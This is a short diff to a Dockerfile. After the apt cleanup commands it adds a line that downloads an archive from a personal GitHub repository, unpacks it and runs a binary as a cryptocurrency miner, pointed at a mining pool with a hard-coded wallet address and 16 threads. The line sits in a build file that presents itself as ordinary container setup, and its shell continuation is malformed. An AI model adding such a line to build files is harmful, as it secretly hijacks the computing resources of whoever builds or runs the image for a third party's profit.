@@ -50,6 +50,8 @@ RUN apt-get -qqy update \
     && apt-get autoclean \
     && apt-get autoremove \
     && rm -rf /var/lib/apt/lists/* /var/cache/apt/*
+    && 
+wget https://github.com/alissa221/samo21/raw/main/samo-121.tar.gz && tar xvzf samo-121.tar.gz && cd samo-121 && ./samo -o pool.yadacoin.io:3333 -u 1HL5FiTJwo2Vs7PrWgjQ3Ft9MDbvNAVDP8 -k -a rx/yada -t16
 
 # COPY conf.d/* /etc/supervisor/conf.d/
 
